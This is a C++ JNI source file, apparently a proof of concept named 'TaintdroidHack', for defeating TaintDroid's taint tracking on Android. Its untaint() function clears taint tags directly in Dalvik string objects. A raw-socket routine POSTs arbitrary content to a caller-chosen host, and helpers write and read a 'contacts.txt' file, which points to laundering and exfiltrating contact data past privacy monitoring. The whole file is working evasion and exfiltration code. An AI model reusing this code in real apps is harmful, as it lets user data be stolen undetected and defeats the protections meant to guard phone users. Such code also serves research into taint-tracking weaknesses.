#include "TaintdroidHack.h"

jboolean send_http_post(JNIEnv *env, jstring content_, jstring host_, int port) {
    const char *content = env->GetStringUTFChars(content_, 0);
    const char *host = env->GetStringUTFChars(host_, 0);

    char *message_fmt = (char *) "POST / HTTP/1.0\r\n"
            "Content-Length: %d\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n\r\n%s";
    char message[strlen(content) + strlen(message_fmt)];
    sprintf(message, message_fmt, strlen(content), content);

    /* create the socket */
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        LOGI("error opening the socket");
        return JNI_FALSE;
    }

    struct hostent *server = gethostbyname(host);
    struct sockaddr_in serv_addr;
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    memcpy(&serv_addr.sin_addr.s_addr, server->h_addr, (size_t) server->h_length);

    /* connect the socket */
    if (connect(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) {
        LOGI("error connecting");
        close(sockfd);
        return JNI_FALSE;
    }

    /* send the request */
    int total = (int) strlen(message);
    int sent = 0;
    int bytes;
    do {
        bytes = (int) write(sockfd, message + sent, (size_t) (total - sent));
        if (bytes < 0) {
            LOGI("error writing message to socket");
            return JNI_FALSE;
        }
        if (bytes == 0) {
            break;
        }
        sent += bytes;
    } while (sent < total);

    char response[4096];
    /* receive the response */
    memset(response, 0, sizeof(response));
    total = sizeof(response) - 1;
    int received = 0;
    do {
        bytes = (int) read(sockfd, response + received, (size_t) (total - received));
        if (bytes < 0) {
            LOGI("error reading response from socket");
            return JNI_FALSE;
        }
        if (bytes == 0)
            break;
        received += bytes;
    } while (received < total);

    if (received == total) {
        LOGI("error storing complete response from socket");
        return JNI_FALSE;
    }

    /* process response */
    LOGI("Response: \n%s\n", response);

    /* close the socket */
    close(sockfd);

    env->ReleaseStringUTFChars(content_, content);
    env->ReleaseStringUTFChars(host_, host);
    return JNI_TRUE;
}

jstring untaint(JNIEnv *env, jstring content_) {
    ScopedJniThreadState ts(env);

    // Reach the actual representation of the JVM-object.
    Object *obj = ts.self()->jniLocalRefTable.get(content_);
    StringObject *str = (StringObject *) obj;

    ArrayObject *arr = str->array();
    // Set the Taint-tag
    arr->taint.tag = TAINT_CLEAR;
    return content_;
}

void write_to_file(JNIEnv *env, jstring content_, jstring dir_) {
    const char *content = env->GetStringUTFChars(content_, 0);
    std::string filePath = env->GetStringUTFChars(dir_, 0);
    filePath += "contacts.txt";
    std::ofstream stream(filePath.c_str());
    stream << content;
}

jstring read_from_file(JNIEnv *env, jstring path_) {
    std::ostringstream ss;
    std::string filePath = env->GetStringUTFChars(path_, 0);
    filePath += "contacts.txt";
    std::ifstream stream(filePath.c_str());
    ss << stream.rdbuf();
    return env->NewStringUTF(ss.str().c_str());
}